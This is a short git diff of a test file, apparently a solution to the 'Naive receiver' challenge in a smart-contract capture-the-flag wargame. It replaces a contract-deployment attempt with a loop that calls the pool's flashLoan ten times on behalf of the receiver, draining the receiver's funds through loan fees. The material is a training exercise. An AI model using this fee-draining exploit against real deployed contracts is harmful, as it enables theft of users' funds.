@@ -57,24 +57,10 @@ describe("[Challenge] Naive receiver", function () {
     /** CODE YOUR SOLUTION HERE */
 
     const ETH = await pool.ETH();
-    const attackerContract = await ethers.getContractFactory(
-      "AttackerNaive",
-      player
-    );
-    let attacker = await attackerContract.deploy(pool.address, ETH);
 
-    console.log({ ETHINTEST: ETH });
-
-    await player.sendTransaction({
-      to: receiver.address,
-      value: ethers.utils.parseEther("10"),
-    });
-
-    await player.sendTransaction({
-      from: player.address,
-      to: attacker.address,
-      value: ethers.utils.parseEther("10"),
-    });
+    for (let i = 0; i < 10; i++) {
+      await pool.flashLoan(receiver.address, ETH, 1n ** 18n, "0x");
+    }
   });
 
   after(async function () {
